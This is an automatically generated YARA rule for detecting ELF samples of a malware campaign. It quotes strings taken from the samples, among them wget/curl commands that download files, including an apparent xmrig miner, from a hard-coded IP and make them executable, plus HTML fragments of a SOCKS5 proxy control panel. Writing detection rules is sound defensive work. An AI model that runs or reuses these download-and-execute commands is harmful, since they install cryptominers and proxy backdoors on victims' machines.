rule Sightlines_tlsh_1d317e3f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1d317e3f"
        date = "2026-10-22"
        campaign = "tlsh-1d317e3f"
        family = ""
        hash = "085147fb40495ff1320a31165c7d0f3232ca577c0cd9e7ab359ef17e9252de26"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1d317e3f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
